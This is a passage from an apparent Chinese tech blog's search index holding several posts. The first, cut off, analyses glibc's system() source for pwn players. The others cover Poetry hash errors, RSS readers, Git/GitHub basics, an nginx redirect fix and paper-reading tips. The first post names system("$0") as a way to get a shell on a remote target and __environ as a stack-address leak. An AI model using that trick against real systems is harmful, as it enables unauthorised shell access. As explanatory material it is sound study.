代表的是 shell 脚本的路径。如果按这个规律进行推断，那 C 程序中调用 system(\"$0\") 应该是再执行一遍当前程序，但为什么远程的机器上可以拿到 shell 呢，这就不得不探究 glibc 中 system 函数的实现，所有的疑问都可以从源码中获得答案。 在探讨环境变量之前，首先让我们来看看 system 函数的实现。 本文采用的 Linux 系统为 ubuntu-20.04，阅读的 glibc 源码为 2.31，测试程序均编译为 amd64-little。 Linux 下 System 函数实现\r起初，我以为 glibc 中 system 函数实现为 fork+execve+waitpid，那么直接输入 $0 肯定会因为找不到 $0 这个程序而崩溃掉。后来发现 fork+execve+waitpid 确实是对 system 接口的一个实现版本，但 glibc 不是这样做的。阅读源码后发现，glibc 对 system 接口的实现更为全面，其在一个新的进程生命周期内做了更多的准备与清理工作。 首先给出 system 函数实现的主调用链： system(__libc_system): sysdeps\\posix\\system.c#193 do_system: sysdeps\\posix\\system.c#102 __posix_spawn: posix\\spawn.c#25 __spawni: sysdeps\\unix\\sysv\\linux\\spawni.c#424 __spawnix: sysdeps\\unix\\sysv\\linux\\spawni.c#312 CLONE: sysdeps\\unix\\sysv\\linux\\spawni.c#67 __spawni_child：sysdeps\\unix\\sysv\\linux\\spawni.c#121 下面一层一层来分析。 实现分析\rsystem int __libc_system (const char *line) { if (line == NULL) /* Check that we have a command processor available. It might not be available after a chroot(), for example. */ return do_system (\"exit 0\") == 0; return do_system (line); } weak_alias (__libc_system, system) 需要提一下的是，如果需要在静态编译去符号的 ELF 文件中快速定位 system 函数 (如果有的话)，可以寻找 exit 0 这个字符串，然后交叉引用即可找到。 do_system __sigaddset (\u0026sa.sa_mask, SIGCHLD); /* sigprocmask can not fail with SIG_BLOCK used with valid input arguments. */ __sigprocmask (SIG_BLOCK, \u0026sa.sa_mask, \u0026omask); __sigemptyset (\u0026reset); if (intr.sa_handler != SIG_IGN) __sigaddset(\u0026reset, SIGINT); if (quit.sa_handler != SIG_IGN) __sigaddset(\u0026reset, SIGQUIT); 这里将 SIGCHLD 阻塞，并设置忽略 SIGINT 和 SIGQUIT 信号。 status = __posix_spawn (\u0026pid, SHELL_PATH, 0, \u0026spawn_attr, (char *const[]){ (char*) SHELL_NAME, (char*) \"-c\", (char *) line, NULL }, __environ); 开始调用 __posix_spawn 函数。 这里的几个参数： pid：存储子进程的 pid SHELL_PATH：是一个宏，其实就是 \"/bin/sh\" spawn_attr：暂不关注 SHELL_NAME：也是一个宏，定义为 \"sh\" line：外部传入的命令行参数，也就是 system 的入参 __environ：指向当前环境变量列表的指针，是一个全局变量 观察几个参数后发现，system(\"xxx\") 的本质就是 /bin/sh（sh） -c xxx，也就是说会使用系统的 shell 来执行程序；另外，新进程的环境变量继承自原进程。 玩 pwn 的小伙伴想比对 __enviorn 这个全局变量不陌生，默认状态下，这里常常存储着一个栈地址。当然，这个变量我在后面会着重探讨，这里还是先关注 system 的实现机制。 __posix_spawn int __posix_spawn (pid_t *pid, const char *path, const posix_spawn_file_actions_t *file_actions, const posix_spawnattr_t *attrp, char *const argv[], char *const envp[]) { return __spawni (pid, path, file_actions, attrp, argv, envp, 0); } 直接调用 __spawni 函数，前 6 个参数直接传递，最后一个参数给的 0 __spawni int __spawni (pid_t * pid, const char *file, const posix_spawn_file_actions_t * acts, const posix_spawnattr_t * attrp, char *const argv[], char *const envp[], int xflags) { /* It uses __execvpex to avoid run ENOEXEC in non compatibility mode (it will be handled by maybe_script_execute). */ return __spawnix (pid, file, acts, attrp, argv, envp, xflags, xflags \u0026 SPAWN_XFLAGS_USE_PATH ? __execvpex :__execve); } 不难发现，最后一个参数决定是使用 __execvpex 还是 __execve，后者直接调用 execve 系统调用，前者做的事情稍微多一点，源码在 posix\\execve.c：196 先判断路径是否包含 / 字符，如果不含 /，则会从 PATH 这个环境变量中寻找 如果 PATH 没有找到，就会拼接当前路径，然后执行 __spwanix while (argv[argc++] != NULL) if (argc == limit) { errno = E2BIG; return errno; } 判断参数是不是超过了界限，limit 的值为 0x7ffffff","date":"2023-11-26","objectID":"/zh-cn/2023-11-25-exploit-env-variable/:0:0","tags":["blog","system","pwn","environment variable"],"title":"从 system 函数的实现看 Linux 下对环境变量的处理","uri":"/zh-cn/2023-11-25-exploit-env-variable/"},{"categories":["questions"],"content":" 最近 poetry install 总是碰到 hash 不匹配的错误，记录一些解决方案 Poetry 简介\rPoetry - Python dependency management and packaging made easy 是一款现代化的 Python 的包管理工具，有着诸多良好的特性。其可以管理包版本、管理虚拟环境、发布包、跟踪依赖、构建包等，功能强大，简单易用。与此类似的还有 hatch、PDM 等包管理工具。 今天的主题不是 poetry，所以对工具不做过多的介绍，有时间再单独写一篇博客来介绍 poetry。安装了 poetry 之后，使用了很长一段时间都没啥问题。但是最近很容易碰到一个哈希不匹配的错误。 Hash 不匹配的错误\r错误截图如下所示，我想安装 pyecharts 库，并安装到 dev 分组里面。 这个时候，我掏出了 everything，直接在本地搜索这个 whl 文件： 从上图可以看到，这里文件的大小是 14KB，路径是在 poetry 配置的 cahe-dir 中的 artifacts 目录下。可以使用 poetry config 看到自己的配置目录，我的配置如下所示： PS D:\\\u003e poetry config --list cache-dir = \"F:\\\\ProgramData\\\\PoetryEnv\" experimental.system-git-client = false installer.max-workers = null installer.modern-installation = true installer.no-binary = null installer.parallel = true virtualenvs.create = true virtualenvs.in-project = null virtualenvs.options.always-copy = false virtualenvs.options.no-pip = false virtualenvs.options.no-setuptools = false virtualenvs.options.system-site-packages = false virtualenvs.path = \"{cache-dir}\\\\virtualenvs\" # F:\\ProgramData\\PoetryEnv\\virtualenvs virtualenvs.prefer-active-python = false virtualenvs.prompt = \"{project_name}-py{python_version}\" 打开 git bash 算一下本地的文件的 hash 然后去网上搜一下最新版的prettytable-3.9.0-py3-none-any.whl： hash 明显对不上，再看下大小： 好家伙，是 27.8KB，然而本地只有 14KB，所以合理推测没有完全把这个包给下载下来。 这个时候，我先把本地缓存的这个包给删掉，然后重新执行 poetry add pyecharts -G dev -vvv，随后便是一长串的报错，定位到最后，就是： 所以，错误原因显而易见：在下载包的时候，网络连接错误，导致包只下载了一半就停止下载了。只下载了一半的包，其 sha256 自然会匹配错误。 翻了下 poetry 的源码，发现他下载包的逻辑是这样的，先到 pypi 网站上获取包的信息，直接 get 请求，我本地用 http 代替： 得到输出： 然后再根据这个 url 去请求下载包。 解决方案\r多试几遍\r不得不说，最朴素的方法是多试几遍，毕竟网络不可能一直不好~那么，多尝试几遍的步骤如下： 删掉 poetry 的缓存文件，具体来说，就是你 cache-dir 下的 cache 子文件夹和 artifacts 子文件夹，直接删除即可 删除 poetry.lock 文件 重新执行 poetry add/install 命令 有时候我多试了几遍，他又可以下载完全了，就很迷。 手动下载 Whl 文件\r所谓头痛医头，脚痛医脚。既然检测出来哈希不一致，那就想办法让他们一致！ 根据 poetry 的报错，自己去 pypi 上下载对应出错的 whl 文件，然后替换掉本地下载的那个不完全的 whl 文件，接着继续执行 poetry add 命令，直到所有的 whl 都下载了完整版的，就不会报错了。 手动可能比较麻烦，可以写一个脚本来自动化地完成这个工作 使用 Pip 下载\r比较推荐，步骤很简单： 手动添加 pyproject.toml 中的包的依赖信息，注意版本 删掉 poetry.lock 文件 执行 poetry shell 进入虚拟环境 使用 pip 下载对应地包 然后执行 poetry install 也可以把缓存文件都删掉，再执行上述步骤。 比如我要安装 pyecharts 包，我先在 pyproject.toml 文件里面添加一行：pyecharts = \"^2.0.4\"，然后手动使用 pip install pyecharts==2.0.4 安装，安装好了后直接 pip install。 只要理解了 poetry 的设计思路，你就会发现可以把安装包这一步从 poetry add 的命令中剥离出来，单独使用 pip 或者 pipx 去安装。不会影响到项目的版本管理。 总结\r😢 村里网不好，总是下不下来包，特别是 poetry，我能怎么办，只能手搓了呀！ 闲来无事去 poetry 的 issue 搜索了以下，发现很多人都有这个问题： Poetry refuses to install package with correct hash · Issue #4523 · python-poetry/poetry · GitHub Site Unreachable 我不理解，为什么不看看日志呢？我还不理解，poetry 的下载模块怕不是有啥猫病，为啥总会突然中断。 所以啊，执行命令的时候记得把 -vvvvvvv 带上~ ","date":"2023-11-23","objectID":"/zh-cn/2023-11-23-poetry-install-hash-error/:0:0","tags":["blog"],"title":"poetry install的hash不一致错误的解决思路","uri":"/zh-cn/2023-11-23-poetry-install-hash-error/"},{"categories":["tools"],"content":"use rss to read the world!","date":"2023-07-15","objectID":"/zh-cn/2023-07-15-use-rss-to-read-the-world/","tags":["blog","rss"],"title":"使用RSS订阅资讯","uri":"/zh-cn/2023-07-15-use-rss-to-read-the-world/"},{"categories":["tools"],"content":" 处于信息时代的今天，可供选择的阅读媒介数不胜数，各类信息让人眼花缭乱。不知不觉，我们早已把自己淹没在信息的海洋中。为了能有效地筛选与获取信息，我尝试过数种方法，RSS 订阅是非常值得推荐的一种方法。本篇博客带大家认识与使用 RSS 订阅，使用 RSS 阅读新闻、博客和论文。 前言\r这是最好的时代，也是最坏的时代。 互联网技术的蓬勃发展让我们真正做到了秀才不出门，能知天下事。只要电脑连上因特网，鼠标轻轻一点，便可以与世界的任何一个角落建立联系。然而，在信息爆炸的今天，各类信息层出不穷，冗余繁杂。大家纷纷感觉到信息的数量大幅增加，但获取信息的效率反而有所下降。造成这种现象的原因，我感觉至少有以下 4 条： 信息传播媒介数不胜数：各类新闻客户端、报纸、自媒体、短视频等软件媒介 信息质量参差不齐：网络上充斥着虚假的、伪造的、偏颇的新闻、言论等 信息更新接连不断：电子信息更新非常及时，但会使人应接不暇 信息数量铺天盖地：前面的几条原因导致信息数量非常庞大，让人无从选择 然后信息是无限的，时间是有限的。为了及时地、高效地获取准确的信息，我们必须要做减法。一是在获取信息的内容上做减法，二是花费在阅读信息的时间上做减法。我列出了以下几条供参考： 内容上拒绝碎片化的信息 内容上拒绝娱乐化的信息 内容上拒绝低质量的信息 时间上每天统一在某个时间处理信息 时间上每天处理信息的时间合理控制 在不同的时间段，对于不同角色的人来说，需要关注的信息和内容会有所变化。正所谓家事国事天下事，事事关心，对于国内外的重要政治、社会新闻，每个人都要及时关注；对于技术工作者，需要时刻追踪最新的技术发展方向；对于科研工作者，需要时刻关注最眼前的研究方向。 今天，供我们选择的信息获取手段非常多，其中， RSS 订阅是一种经典的、简单的、高效的信息获取方法。 或许你会问：为什么 2023 年了，我还在用 RSS 订阅？我想，这个问题的答案非常简单，因为 RSS 订阅的模式符合我的个人需求，可以解决信息获取中的一些问题。在我看来，RSS 至少有以下优点： 可以自由挑选所感兴趣的内容进行订阅 可以控制和调整内容推送的时间 可以自己制作订阅文件 正因为 RSS 还保留着上述优点，所以使用 RSS 订阅信息仍然是一种不错的选择。本篇博客，我将介绍RSS相关的一些内容以及我自己使用的一些软件、插件等。 接下来的布局安排如下。第二介绍部分将会介绍 RSS 协议及其发展历史、ATOM 标准及其发展历史。第三部分将介绍 RSS 阅读的三种姿势，分别是阅读资讯、阅读博客和阅读论文。第四部分将介绍 RSS 的订阅工具，包括桌面软件、浏览器插件等。最后是博客的小结。 RSS 介绍\rRSS 是一种内容聚合的协议1，其可以聚合多个网站更新的内容并生成一个摘要，提供给订阅了资源的订阅者。 RSS 的含义经历了几次变化，从英文来看依次是： Really Simple Syndication Resource Description Framework Resource Site Summary Rich Site Summary 总的来说，RSS 是对站点内容的更新总结，最后呈现的方式是一个 XML 文件。根据 XML 文件内容的不同，我将其分为传统的 RSS 协议以及新的 ATOM 标准。 RSS 协议\r在菜鸟教程2 中介绍的一个 rss 订阅文件示例如下： \u003c?xml version=\"1.0\" encoding=\"UTF-8\" ?\u003e \u003crss version=\"2.0\"\u003e \u003cchannel\u003e \u003ctitle\u003e菜鸟教程首页\u003c/title\u003e \u003clink\u003ehttp://www.runoob.com\u003c/link\u003e \u003cdescription\u003e免费编程教程\u003c/description\u003e \u003citem\u003e \u003ctitle\u003eRSS 教程\u003c/title\u003e \u003clink\u003ehttp://www.runoob.com/rss\u003c/link\u003e \u003cdescription\u003e菜鸟教程 Rss 教程\u003c/description\u003e \u003c/item\u003e \u003citem\u003e \u003ctitle\u003eXML 教程\u003c/title\u003e \u003clink\u003ehttp://www.runoob.com/xml\u003c/link\u003e \u003cdescription\u003e菜鸟教程 XML 教程\u003c/description\u003e \u003c/item\u003e \u003c/channel\u003e \u003c/rss\u003e 可以看到，该文件中主要有以下几个标签： rss 标签：顶层标签，进行声明 channel 标签：一个 channel 就是一个源 title 标签：每一篇文章的标题 link 标签：每一篇文章的链接 description 标签：每一篇文章的描述 由此来看，RSS 协议非常简单，只要你在自己的博客网站下放置一个文件，文件的格式符合 XML 标准，并且含有以上要素，即可提供给他人订阅使用。 一般来说，每当你的网站更新的时候，都需要自动生成一个 rss 订阅文件，以便向他人提供你的网站最近更新内容。以我的个人博客为例，流程如下： graph TD\rA[写新博客]--\u003eB[渲染HTML]\rB --\u003e C[生成最新的RSS订阅文件]\rgraph TD\rA[写新博客]--\u003eB[渲染HTML]\rB --\u003e C[生成最新的RSS订阅文件]\r这样的话，一旦我更新了博客，只要订阅了我提供的rss文件，就能及时读取到博客的最新内容。 ATOM 标准\r参考 ATOM 标准3的介绍可知，ATOM标准和RSS标准很类似，但是他解决了RSS无法克服的几个问题： 通过标签区分可能包含的编码的HTML内容 可以指示相对地址，而不仅仅是绝对地址 具有统一的标准 所以，现在一般使用ATOM标准提供网站的rss订阅文件。 RSS 阅读姿势\r在万物互联的时代，RSS可以用来做很多事情，而我一般使用rss来阅读资讯、博客和论文。 使用 RSS 阅读资讯\r可以订阅知乎日报等平台阅读资讯 使用 RSS 阅读博客\r很多大佬的博客是提供 rss 订阅文件的，只需要抓取该文件即可。我的博客同样提供 rss 订阅，一般的博客生成工具都会提供该项功能。 使用 RSS 阅读论文\r学术期刊一般会提供rss订阅文件，之后可以使用该文件阅读最新的论文。当然，如果没有提供的话，可以自己写脚本进行解析期刊的首页，定时触发解析即可获取最新的论文。 RSS 订阅工具\r桌面软件\r推荐这个sismics/reader: Free and open source feeds reader, including all major Google Reader features (github.com) Web 客户端\r基本是要收费的，免费的不是很好用，用了几个我都弃了 浏览器插件\r强烈推荐两个： Feedbro - RSS Feed Reader with built-in Rule Engine (nodetics.com)用来管理 Introduction | RSSHub用来嗅探，使用这个Routes | RSSHub简直是神器，这个工具非常值得使用和探索 目前我是用浏览器插件，本地导出为文件进行迁移，或者可以上传到google drive进行统一迁移和管理 使用 Zotero\r信息太简陋了，还是别用zotero订阅RSS吧，换个别的。 Python 包\r使用这个lkiesow/python-feedgen: Python module to generate ATOM feeds, RSS feeds and Podcasts. (github.com)生成和解析订阅文件，对于不提供rss订阅的网站，自己写脚本解析 博客小结\r看似有很多内容，其实啥也没有~🦀 水一篇博客罢了~ 引用参考\rRSS - Wikipedia ↩︎ RSS 教程 | 菜鸟教程 ↩︎ ATOM-WIKI ↩︎ ","date":"2023-07-15","objectID":"/zh-cn/2023-07-15-use-rss-to-read-the-world/:0:0","tags":["blog","rss"],"title":"使用RSS订阅资讯","uri":"/zh-cn/2023-07-15-use-rss-to-read-the-world/"},{"categories":["tools"],"content":" 之前的一次组会上，给组内小伙伴分享了 Git 和 Github 有关的基础概念与原理，介绍了使用 Github 进行协作开发的流程。 本篇博客会总结材料的主要内容，并提供材料的 PPT 和 PDF 文件下载连接。 现在 Github 网站改版了，PPT 是基于改版前的排版而制作的。 本次分享的是基础使用教程，不涉及复杂的git命令讲解。 文档只提供了大纲，很多细节没有体现在文档中，欢迎与我探讨。 注意\r本次分享不会详细介绍如何使用 Git。如果你需要学习 Git 的使用，可以访问互联网上的 Git 使用教程进行学习。本次分享中，我侧重于描述 Git 的设计原理、设计哲学等，并会详细介绍使用 Github 协作开发的流程。\r版本控制系统\r基本概念\r版本控制系统（Version Control System）是一种记录文件内容变化的系统，可以在文件被修改时，将这些修改记录下来，以便将来可以查阅特定版本的文件内容。总结为一句话就是：随着时间的推移，使用版本控制系统记录项目的迭代过程。 版本控制系统的主要作用归纳如下： 追踪文件修改 比较版本差异 回滚历史版本 支持协同开发 提高开发效率 增强代码质量 发展历史\r根据 Version Control by Example 的有关介绍，归纳出版本控制系统的发展历程经历了三个阶段： 本地式版本控制系统：典型代表 RCS 集中式版本控制系统：典型代表 SVN 分布式版本控制系统：典型代表 GIT 其中，本地式版本控制系统只能在本地存储版本，不支持协作共享；集中式版本控制系统集中存储版本，但容易受到单点故障的影响；分布式版本控制系统分布式存储版本，支持本地离线开发，非常灵活与强大。 Git 介绍\rGit 的诞生\rGit 诞生的背后有一些有趣的故事。故事来源于 这里，读完这个故事我的感受是大佬解决问题的方式简单而又直接。 Git 设计哲学\r要谈论 Git 的设计哲学，必然绕不开 Linux 的设计哲学，毕竟他俩都出自同一人之手。我在这里简单总结了 Linux 的设计哲学和 Git 的设计哲学。 Linux 设计哲学 一切皆文件（抽象的力量） 简洁至上（小而美） 每个程序只做一件事（但做到极致） 提供机制而非策略 Git 的设计哲学 一切皆对象 设计多个子命令 每个命令只做一件事 提供丰富的扩展 总的来说，以上的设计哲学可以归纳为： 抽象 组合 接口 抽象就是把现实世界中的实体与计算机世界中的对象互相映射，可以说抽象是计算机设计的灵魂；组合是为了降低系统各个组件之间的耦合程度；接口则可以提升系统的扩展能力。 而从https://grahamlopez.org/git/git_philosophy.html的文章，其总结了 git 的五大哲学： snapshot, not deltas History is only for humans Branching is free Ignore the index There are no server repositories 关于这五条，我也在旁边做了注解。 基本概念\rGit 的存储区域有工作去、暂存区、版本库和远程库四个概念，使用 Git 进行版本管理就是使用不同的命令在这四个存储区域中切换。这里仅仅只是列举出了几个简单的命令，详细的命令需要去官网查询。 事实上，Git 还设计了其他的存储区，例如使用 git stash 命令的临时区域，这个区域是独立于分支外的。 分支管理\rGit 的分支设计非常有趣，在不同的分支之间切换几乎不会耗费太多时间，这得益于 Git 优秀的存储与索引机制设计。我使用了一个小例子来展示 Git 是如何做版本管理的。 只要经过了 git commit 保存，你可以在不同的时间节点上任意穿梭。 因此，在进行远程操作的时候，一定要用 git status 命令检查一下自己的工作区和暂存区。如果只把文件存储到了暂存区，仍然会存在文件丢失的风险。 Git 切换分支之所以很快，是因为只是修改了指针的指向。 除了分支管理之外，Git 还支持标签管理。在项目的重要节点，如发布、重要更新等，可以使用 git tag 打上标签。标签是不可变的，且在所有的分支均可见。 文件忽略\r有些敏感文件、隐藏文件、临时文件、非文本文件等不应该被 git 管理，此时可以使用 .gitignore 文件，告诉 Git 要忽略哪些文件。可以设置黑名单，也可以设置白名单。 提交规范\r为了方面与他人协作，快速回溯之前的某次修改，建议提交 commit 的时候遵循统一的格式规范，主流的格式规范如下所示。 Git 工作流\r使用 Git 开发需要遵循规范的工作流，需要引入分支管理、标签管理等策略，合理地推动开发进度。当代码越来越大的时候，仍保证 git tree 清晰可读。 Github 介绍\r主要介绍网站的主界面和仓库的主界面内容。Github 主界面经历了一次改版，但是主体内容与之前相差不大。 网站主界面\r网站主界面如下，主界面非常丰富。 仓库主界面\r这里只列举了部分的仓库主界面。 远程仓库\rGit 支持关联多个远程仓库，只要仓库实现了 git 协议。一般来说，有两种方式： 完全从无到有克隆远程仓库 将本地的仓库和远程仓库关联起来 Git 会在本地维护一个远程仓库的文件夹，存储远程仓库各个分支的指针信息。 协作方式\r基于 Github 协作开发有两种方式，一种是基于团队，一种是基于 fork+pr 的方式。 如果是基于团队的话，直接给开发人员设置权限，然后开发人员可以使用 git push 提交代码；而 fork+pr 的方式相对麻烦一点。事实上，开发人员较多的时候，不同的开发人员角色不同，需要将这两种方式结合起来，给代码仓设置团队的权限，然后在团队中有 committer、coder 等角色，负责审阅代码和提交代码。 Github 工作流\r下面的图和右边的示例代码给出了 github 的工作流，这也是开源社区广泛采用的一种流程。 划重点：push 之前一定要同步上游仓库。同步命令我喜欢用 git fetech + git rebase。 可视化工具\r工欲善其事，必先利其器。 分享总结\r最后一页是总结。 下载链接\r提供了由我制作的PPT和由此PPT导出的PDF，按需下载即可。个人的PPT制作水平一般，还请见谅~ 📃 PDF下载链接 📃 PPT下载链接 ☕ 如果本文帮助到你，可以点击下方的赞赏按钮请我喝杯咖啡~ 参考引用\r[1] https://ericsink.com/vcbe/html/bk01-toc.html [2] https://www.liaoxuefeng.com/wiki/896043488029600 [3] https://git-scm.com/ [4] https://github.com/ [5] https://grahamlopez.org/git/git_philosophy.html ","date":"2023-07-11","objectID":"/zh-cn/2023-07-11-git-and-github/:0:0","tags":["blog","git","github"],"title":"Git与Github的简要分享","uri":"/zh-cn/2023-07-11-git-and-github/"},{"categories":["questions"],"content":" 现在访问我的博客，带或者不带斜杠均可正常访问。 前言\r话说昨天整理了一下好久没折腾的个人博客网站，把之前 pwn 训练营的所有的资料整理到了一篇博客中，并发表了一条 Bilibili 动态。今天下午，我正喝着咖啡唱着歌，改着过两天要汇报的 PPT，突然手机弹出一条消息，发现 B 站有个师傅给我留言说博客链接打不开，如下图： 而我动态里面的链接为：https://www.roderickchan.cn/zh-cn/2023-05-06-shg-pwn-tutorial-1，注意，这个链接的最后是不带反斜杠 / 的。 看到消息后我立马放下咖啡，将这个链接拷贝到浏览器中，发现确实打不开。但是，我又发现当链接结尾带上一个反斜杠之后，可以成功访问。于是，我先回复了这位师傅，将博客链接更新为带上反斜杠的 URL。 回复后，我开始感到疑惑：为什么这个 URL 的末尾带上反斜杠会访问成功，而不带上反斜杠会访问失败呢？这其中一定蕴含着我不知道的知识点。我暂时先放下了手头的 PPT，开始对问题进行分析。 问题探寻\r考虑到我把博客同时备份到了 github 上面，因此，我把域名替换为 roderickchan.github.io 之后，再去访问https://roderickchan.github.io/zh-cn/2023-05-06-shg-pwn-tutorial-1，发现这个链接是可以正确打开的。但是这个域名是 github 提供的，我猜测他的服务器和我自己拥有的域名 www.roderickchan.cn 的服务器对请求的处理方式不太一样。 需要指出的是，我的 www.roderickchan.cn 这个域名提供的博客服务的运行架构如下，在我的[建站教程] 使用 aliyun+hugo 搭建个人博客 - roderick - record and learn!里面，有这样一张图解释了我是如何搭建个人博客服务以及把文件均存储在本地的。 我立马去看了一下我本地的文件，发现 zh-cn/2023-05-06-shg-pwn-tutorial-1 是一个目录，这个目录下面有一个 index.html，正是 hugo 渲染后的 HTML 文件。按理来说，当使用 http 访问一个目录的时候，默认会访问目录下面的 index.html，也就是说，访问不带斜杠的链接应该是可以访问成功的。 所以，我先访问了我本地端口，访问http://127.0.0.1:10081/zh-cn/2023-05-06-shg-pwn-tutorial-1，访问成功： 并且在访问成功后，浏览器会自动在 URL 后面添加一个反斜杠： 这里需要补充一个知识点。 当请求资源的 url 不带反斜杠的时候，服务器的处理一般如下： 如果对应的 url 是一个文件，会返回文件给你 如果对应的 url 是一个目录，会返回对应目录下的 index.html 文件 打开浏览器的控制台查看网络请求过程中的包信息： 结合上图分析可知，当我访问https://127.0.0.1:10081/zh-cn/2023-05-06-shg-pwn-tutorial-1的时候，我本地的 nginx 服务器会返回一段响应报文，报文中有一个字段 Location，告诉浏览器资源的真正位置为https://127.0.0.1:10081/zh-cn/2023-05-06-shg-pwn-tutorial-1/；接着，浏览器基于收到的 Location 信息去发出第二次请求，此时就成功请求到了内容，如下所示： 那么问题来了，当访问https://www.roderickchan.cn/zh-cn/2023-05-06-shg-pwn-tutorial-1时，服务器给的 Location 字段是什么呢？ 这个时候，为了避免需要重复修改浏览器窗口的 URL，我掏出了 curl 分析报文。 发现服务器给的 Location 竟然带上了端口号，而且这个端口是我的后端代理端口，而我的公网服务器上的配置大概是酱紫的： location / { proxy_pass http://127.0.0.1:10081; proxy_intercept_errors on; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto https; } 怎么肥事？怎么在域名后面加上了本地代理的端口呢 ❓ 我沉思片刻，联想到前面 127.0.0.1:10081 本地服务并无异常的情况，我好像有点明白了。我猜测这里的 Location 是真正处理请求的后端代理服务器转发给我的公网服务器的信息，然后公网服务器又拿着这个 Location 又转发给了我的浏览器，我的浏览器拿着这个 url 去访问，没有对应的服务，自然就会报错了。 为了验证自己的猜测，我登录自己的公网服务器对 10081 端口抓包： 红框是抓包命令，蓝框是公网服务器发给代理后端的请求，黄框是代理后端返回的请求。可以看到，代理后端确实返回了 http://www.roderickchan.cn:10081/zh-cn/2023-05-06-shg-pwn-tutorial-1/。 到这里，就搞清楚了整个访问过程是如何进行的。 于是，我接着谷歌1，发现了 nginx 返回 location 字段时，如果不是默认 80/443 端口，会带上端口号，所以这就解释了为什么后端的代理服务器给的 Location 带有端口号。 解决办法\r搞清楚问题来源后，我开始搜索 nginx 如何修改 proxy 的 Location 字段。很快啊，很快发现有个指令 proxy_redirect。在查看了该指令的说明1后，我立马对配置文件进行了修改： location / { proxy_pass http://my_blog; proxy_intercept_errors on; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto https; proxy_redirect ~^http://www\\.roderickchan\\.cn:(10080|10081|10082)(/.*)$ https://www.roderickchan.cn$2; } 这里的 proxy_pass 为 http://my_blog; 是因为我做了负载均衡。 修改后重新启动 nginx 。然后，再使用 curl 验证，发现可以正常访问了： 至此，就成功地解决了这个问题。 于是我又继续打开 PPT，重新点了一杯咖啡，然后合上 PPT，开始写这篇博客。 哦对了，还有一个小问题，由于我配置了负载均衡，还代理了服务器上本地的 10080 端口，于是，之前有时候会访问 rodeirckchan.cn:10080 ，会报错如下： 这个错误不同凡响！ 搜索后发现： 竟然把端口给封了🤯 引用参考\rhttp://nginx.org/en/docs/http/ngx_http_core_module.html ↩︎ ↩︎ ","date":"2023-07-03","objectID":"/zh-cn/2023-07-03-deal-with-a-nginx-problem/:0:0","tags":["blog","nginx","url"],"title":"解决博客链接结尾不带斜杠时访问失败的问题","uri":"/zh-cn/2023-07-03-deal-with-a-nginx-problem/"},{"categories":["paper"],"content":"How to read a paper","date":"2023-07-01","objectID":"/zh-cn/2023-07-01-how-to-read-paper/","tags":["blog","skill","paper"],"title":"阅读论文的姿势总结","uri":"/zh-cn/2023-07-01-how-to-read-paper/"},{"categories":["paper"],"content":" 论文不是万能的，但没有论文是万万不能的。 论文筛一筛\r作为一名合格的研究生，必须要学会自己阅读论文。然而近些年来，随着学术圈的不断内卷，学术论文的数量一路飙升。众所周知，事物总体数量的增加必定带来总体质量的下降。不管是什么领域什么期刊，论文的质量都是良莠不齐的，想要从“芸芸众刊“中找到一片佳作，堪比大海捞针。然虽为大海捞针，但还是有一些章法的，学会了这些办法就能让你更快地从大海里面捞到你需要的那根针，并且捞到一根质量上乘的好针。 沃兹基认为，读论文犹如行军打仗。孙子云：知己知彼，百战不殆。所以，在读论文的第一步，要对自己有些 ACDEF 数。也就是说，在读论文前你起码先要明白三个问题： 你是谁 你从哪儿来 你要到哪儿去 不出意外，你应该遇到过小区门口的保安大爷，他会向你抛出这三个问题，如果你回答错误，他会残忍地拒绝你进入小区。这三个问题大到人生方向的抉择，小到今天中午吃什么的选择，都很适合时不时拿出来问一问自己。 比如，在读书时的这三个问题代表着：你是学什么专业的；你准备研究什么方向什么问题；你研究问题后要去做什么。而落实到论文上就是：你的专业决定了你要读哪些期刊；你的研究方向决定了你要读哪基本期刊或者专刊；你想发哪本期刊。在自我认知的过程中，还要注意两点： 不可好高骛远，要清楚地认识到自己有多大的能力干多大的事情。你要是一上来就决定第一篇文章非 Science 和 Nature 不发，那我只能祝你好运。当然，如果你爸是校长，当我没说。 不要妄自菲薄。搞学术和搞其他事情没什么两样，别人做得，你自然也做得。要有足够的自信，相信自己可以发、能够发、必然发好的学术文章。 以上，“知己“的过程结束，就该“知彼“了。 私以为，拿到一篇文章后，首先要四看： 一看领域。它是什么领域，是否与你的研究方向相关。 二看刊物。它来自哪本期刊/会议，期刊/会议的各项参数 (分区、影响因子等)如何。 三看作者。它作者是谁，通讯是谁，通讯单位是哪所研究机构。 四看引用。它的被引高不高，它引用了哪些文章。 四看结束后，你就可以确定这篇文章要不要读，要精读还是浏览，什么时候读，以及要花多少时间去读。 一般来说，我会在每周一的早上列出本周的论文阅读计划，包括要粗读的文章和精读的文章。 走马观花法\r虽说是走马观花，但是这里得加上一个引号。走马观花本来是只过眼睛不过脑子，但是，对于读论文来说，尽管是粗略地浏览一下文章，可文章的内容仍然需要思考。至少，你需要知道文章的方法是什么，方法有哪些创新点。 走马观花法侧重于某一个或两个章节的阅读，其他章节快扫一遍或者直接忽略。对于我自己而言，我一般侧重于对文章方法的阅读。基本上，读完摘要之后，我会直接跳转到方法这一章，然后看懂方法介绍的流程图、技术图（甚至都不需要把方法全文读完，把图读懂足矣）等。弄懂了以上这些之后，扫一眼数据，看一些实验结论的图，最后扫一眼结论的最后几句话，也就是 limitation and future work，大概把握一下未来的方向，就结束了本篇文章的阅读工作。 这里有一些快速阅读各个章节的技巧。 引言部分：直接跳到最后一段看作者归纳的贡献 相关工作：看标题即可 方法：把图看懂 结果：看图 讨论：看每一段的第一句 结论：看每一段的第一句 读的快的话，半个小时就可以搞定。读得慢的话，一个小时左右，但是，不建议花两个小时以上的时间进行浏览，否则就变成了精读文章。 当然，不同的专业对文章的侧重点不一样。对于技术类型的专业，需要关注文章的方法是如何实现的，方法的优缺点如何，还有没有改进的方向。只要把握住了方法，文章的其他内容可以忽略。 不同类型的文章的侧重点也不同。例如综述类的文章，需要重点读一读结论。综述类的文章在结论章节会给出该领域研究成果的总结以及未来可能的研究方向。如果对某一个小的方向感兴趣，可以再回到文章前面进行详细浏览。 处于不同的科研时期对文章的侧重点也不同。比如当你的文章写到了实现部分，你需要筛选出领域内的优秀文章，重点查看这些文章的实验设计方案、实验设计指标等。此时，实验章节又成为了重点。 